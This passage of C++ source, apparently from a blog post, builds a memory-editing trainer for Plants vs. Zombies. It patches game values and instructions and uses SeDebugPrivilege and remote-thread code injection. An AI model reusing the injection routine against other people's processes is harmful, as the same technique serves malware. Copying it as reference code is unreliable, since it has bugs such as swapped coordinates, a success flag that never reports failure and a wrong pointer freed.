dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 计算基地址  [[6A9EC0]+768]+5560</span><br><span class=\"line\">\tDWORD dwTemp = 0;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x6A9EC0, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdwTemp += 0x768;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPVOID)dwTemp, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD dwsun = 99999;</span><br><span class=\"line\">\tdwTemp += 0x5560;</span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(dwTemp), &amp;dwsun, sizeof(DWORD), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 计算基地址  [[006A9EC0]+82c]+28</span><br><span class=\"line\">\tDWORD dwTemp = 0;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x6A9EC0, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdwTemp += 0x82c;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPVOID)dwTemp, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD dwGold = 99999;</span><br><span class=\"line\">\tdwTemp += 0x28;</span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(dwTemp), &amp;dwGold, sizeof(DWORD), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 计算基地址  [[6A9EC0]+768]+5560</span><br><span class=\"line\">\tDWORD dwTemp = 0;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x6A9EC0, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdwTemp += 0x768;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPVOID)dwTemp, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD dwsun = m_edit_sun;</span><br><span class=\"line\">\tdwTemp += 0x5560;</span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(dwTemp), &amp;dwsun, sizeof(DWORD), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 计算基地址  [[006A9EC0]+82c]+28</span><br><span class=\"line\">\tDWORD dwTemp = 0;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x6A9EC0, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdwTemp += 0x82c;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPVOID)dwTemp, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD dwGold = m_edit_gold;;</span><br><span class=\"line\">\tdwTemp += 0x28;</span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(dwTemp), &amp;dwGold, sizeof(DWORD), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t// 00487296 - 7E 14                 - jle 004872AC  植物cd判断跳转代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_nocd)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x7E;</span><br><span class=\"line\">\t\tbuf[1] = 0x14;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x00487296), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t//00461565 - 75 5F   - jne 004615C6</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_bigmouth_nocd)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x75;</span><br><span class=\"line\">\t\tbuf[1] = 0x5f;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x00461565), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># if 0 </span><br><span class=\"line\">// 裸函数，不需要编译器添加任何代码</span><br><span class=\"line\">__declspec(naked) void putPlant()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpushad</span><br><span class=\"line\">\t\tpush -1</span><br><span class=\"line\">\t\tpush 2</span><br><span class=\"line\">\t\tmov eax, 4</span><br><span class=\"line\">\t\tpush 4</span><br><span class=\"line\">\t\tmov ebx, ds:[0x6A9EC0]</span><br><span class=\"line\">\t\tmov ebx, ds:[ebx + 0x768]</span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tmov edx, 0x40D120</span><br><span class=\"line\">\t\tcall edx</span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton5()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t// 打开目标进程</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t// 在目标进程分配内存空间</span><br><span class=\"line\">\tPVOID ThreadFunAdd = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 往分配的内存空间中写入代码</span><br><span class=\"line\">\tDWORD byWrite = 0;</span><br><span class=\"line\">\tbool bret = WriteProcessMemory(hProcess, ThreadFunAdd, putPlant, 4096, &amp;byWrite);</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 执行目标进程指定地址的代码</span><br><span class=\"line\">\tCreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadFunAdd, NULL, NULL, NULL);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bool CplantDlg::enableDebugPriv()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHANDLE hToken;</span><br><span class=\"line\">\tLUID sedebugnameValue;</span><br><span class=\"line\">\tTOKEN_PRIVILEGES tkp;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCloseHandle(hToken);</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttkp.PrivilegeCount = 1;</span><br><span class=\"line\">\ttkp.Privileges[0].Luid = sedebugnameValue;</span><br><span class=\"line\">\ttkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCloseHandle(hToken);</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::addPlantsToCombox()</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\tint i = 0;</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;樱桃炸弹&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 2);</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;毁灭菇&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 15);</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;寒冰菇&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 14);</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;魅惑菇&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 12);</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;坚果墙&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 3);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct PutPlantsPareame</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUINT u_x;</span><br><span class=\"line\">\tUINT u_y;</span><br><span class=\"line\">\tUINT u_plantID;</span><br><span class=\"line\">&#125;PutPlantsParame,*PPutPlantsPareame;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">DWORD __stdcall CplantDlg::PutPlants(LPVOID lpThreadParame)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPPutPlantsPareame pParame = (PPutPlantsPareame)lpThreadParame;</span><br><span class=\"line\">\tUINT u_x = pParame-&gt;u_x;</span><br><span class=\"line\">\tUINT u_y = pParame-&gt;u_x;</span><br><span class=\"line\">\tUINT u_plantid = pParame-&gt;u_plantID;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpushad</span><br><span class=\"line\">\t\tpush -1</span><br><span class=\"line\">\t\tpush u_plantid</span><br><span class=\"line\">\t\tmov eax, u_x</span><br><span class=\"line\">\t\tpush u_y</span><br><span class=\"line\">\t\tmov ebx, dword ptr ds:[0x6A9EC0]</span><br><span class=\"line\">\t\tmov ebx, dword ptr ds:[ebx + 0x768]</span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tmov edx, 0x0040D120</span><br><span class=\"line\">\t\tcall edx</span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int CplantDlg::GetPlantsIDByName(CString name)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i = m_cbPlantsChoose.FindString(-1, name);</span><br><span class=\"line\">\treturn m_cbPlantsChoose.GetItemData(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton5()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUpdateData(TRUE);   //从页面读取变量</span><br><span class=\"line\">\tCString strPlantName = _T(&quot;&quot;);</span><br><span class=\"line\">\tDWORD dwPlantID = 0;</span><br><span class=\"line\">\tDWORD dwPid = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_cbPlantsChoose.GetWindowText(strPlantName);</span><br><span class=\"line\">\tdwPlantID = GetPlantsIDByName(strPlantName);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//打开进程</span><br><span class=\"line\">\tdwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\t//远程调用参数</span><br><span class=\"line\">\tPutPlantsPareame parame;</span><br><span class=\"line\">\tparame.u_plantID = dwPlantID;</span><br><span class=\"line\">\tparame.u_x = m_x;</span><br><span class=\"line\">\tparame.u_y = m_y;</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif (!InjectRemoteFunc(dwPid, PutPlants, &amp;parame, sizeof(parame)))</span><br><span class=\"line\">\t\tMessageBox(_T(&quot;远程调用失败&quot;), NULL, 0);</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CplantDlg::InjectRemoteFunc(DWORD dwPid, LPVOID mFunc, LPVOID pRemoteParam, DWORD dwParameSize, DWORD dwWaitTime)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHANDLE hProcess = NULL;</span><br><span class=\"line\">\tLPVOID ThreadAdd = NULL;</span><br><span class=\"line\">\tDWORD lpNumberofBytes = 0;</span><br><span class=\"line\">\tBOOL bret = FALSE, bSucc = TRUE;</span><br><span class=\"line\">\tLPVOID ParamAdd = NULL;</span><br><span class=\"line\">\tHANDLE hThread = NULL;</span><br><span class=\"line\">\tDWORD dwWait = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdo</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//打开被注入的进程</span><br><span class=\"line\">\t\thProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\t\tif (NULL == hProcess) break;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t//装载函数的空间</span><br><span class=\"line\">\t\tThreadAdd = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t\tif (NULL == ThreadAdd) break;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t//写入函数</span><br><span class=\"line\">\t\tbret = WriteProcessMemory(hProcess, ThreadAdd, mFunc, 4096, &amp;lpNumberofBytes);</span><br><span class=\"line\">\t\tif (FALSE == bret) break;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif (0 != dwParameSize)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t//装在函数所需要的参数空间</span><br><span class=\"line\">\t\t\tParamAdd = VirtualAllocEx(hProcess, NULL, dwParameSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\t\t\tif (NULL == ParamAdd) break;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\t//写入参数地址</span><br><span class=\"line\">\t\t\tbret = WriteProcessMemory(hProcess, ParamAdd, pRemoteParam, dwParameSize, &amp;lpNumberofBytes);</span><br><span class=\"line\">\t\t\tif (FALSE == bret) break;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// 创建远程线程</span><br><span class=\"line\">\t\thThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadAdd, ParamAdd, NULL, &amp;lpNumberofBytes);</span><br><span class=\"line\">\t\tif (NULL == hThread) break;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tbSucc = TRUE;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125; while (FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//等待线程结束</span><br><span class=\"line\">\tif (bSucc)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tdwWait = WaitForSingleObject(hThread, dwWaitTime);</span><br><span class=\"line\">\t\tif (WAIT_TIMEOUT == dwWait) goto end;   //如果超时放弃释放资源，防止目标进程在使用</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//释放目标线程中分配的资源</span><br><span class=\"line\">\tif (bSucc &amp;&amp; ThreadAdd &amp;&amp; hProcess)</span><br><span class=\"line\">\t\tVirtualFreeEx(hProcess, ThreadAdd, 0, MEM_RELEASE);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (bSucc &amp;&amp; (0 != dwParameSize) &amp;&amp; pRemoteParam &amp;&amp; hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tVirtualFreeEx(hProcess, pRemoteParam, 0, MEM_RELEASE);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">end:</span><br><span class=\"line\">\tif (NULL != hThread) CloseHandle(hThread);</span><br><span class=\"line\">\tif (NULL != hProcess) CloseHandle(hProcess);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn bSucc;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//如果使用stdcall,，然后WriteProcessMemory使用单独计算的地址，我的程序会崩溃，只知道是写入多了很多编译器加的代码，但这些代码为什么会出错暂时没找到原因</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton6()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[4] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_noblood)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x83;</span><br><span class=\"line\">\t\tbuf[1] = 0x46;</span><br><span class=\"line\">\t\tbuf[2] = 0x40;</span><br><span class=\"line\">\t\tbuf[3] = 0x01;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x83;</span><br><span class=\"line\">\t\tbuf[1] = 0x46;</span><br><span class=\"line\">\t\tbuf[2] = 0x40;</span><br><span class=\"line\">\t\tbuf[3] = 0xFC;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0052FCF0), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span 